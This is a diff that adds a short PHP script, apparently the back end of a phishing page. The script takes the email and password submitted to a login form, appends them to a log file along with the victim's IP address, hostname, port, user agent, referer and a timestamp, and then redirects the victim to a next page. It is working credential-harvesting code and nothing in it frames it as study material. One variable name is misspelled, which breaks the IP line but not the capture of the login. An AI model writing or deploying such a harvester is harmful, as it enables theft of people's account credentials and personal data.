@@ -1,0 +1,32 @@
+<?php
+
+$protocol = $_SERVER['SERVER_PROTOCOL'];
+$ip = $_SERVER['REMOTE_ADDR'];
+$port = $_SERVER['REMOTE_PORT'];
+$agent = $_SERVER['HTTP_USER_AGENT'];
+$ref = $_SERVER['HTTP_REFERER'];
+$hostname = gethostbyaddr($_SERVER['REMOTE_ADDR']);
+$date = new DateTime();
+$date = $date->format("y:m:d h:i:s");
+
+
+$handle = fopen("log.txt", "a");
+fwrite($handle, "\r\nEmail: ");
+fwrite($handle,$_POST["email"]);
+fwrite($handle, "\r\nPassword: ");
+fwrite($handle,$_POST["pass"]);
+fwrite($handle, "\r\n\n");
+
+fwrite($handla, 'IP Address: '."".$ip ."\r\n");
+fwrite($handle, 'Hostname: '."".$hostname ."\r\n");
+fwrite($handle, 'Port Number: '."".$port ."\r\n");
+fwrite($handle, 'User Agent: '."".$agent ."\r\n");
+fwrite($handle, 'HTTP Referer: '."".$ref ."\r\n");
+
+fwrite($handle, 'Time: '."".$date."\r\n\n");
+fwrite($handle,"________________________________________________________________\r\n");
+
+fclose($handle);
+header ('Location: page_next.html');
+exit;
+?>
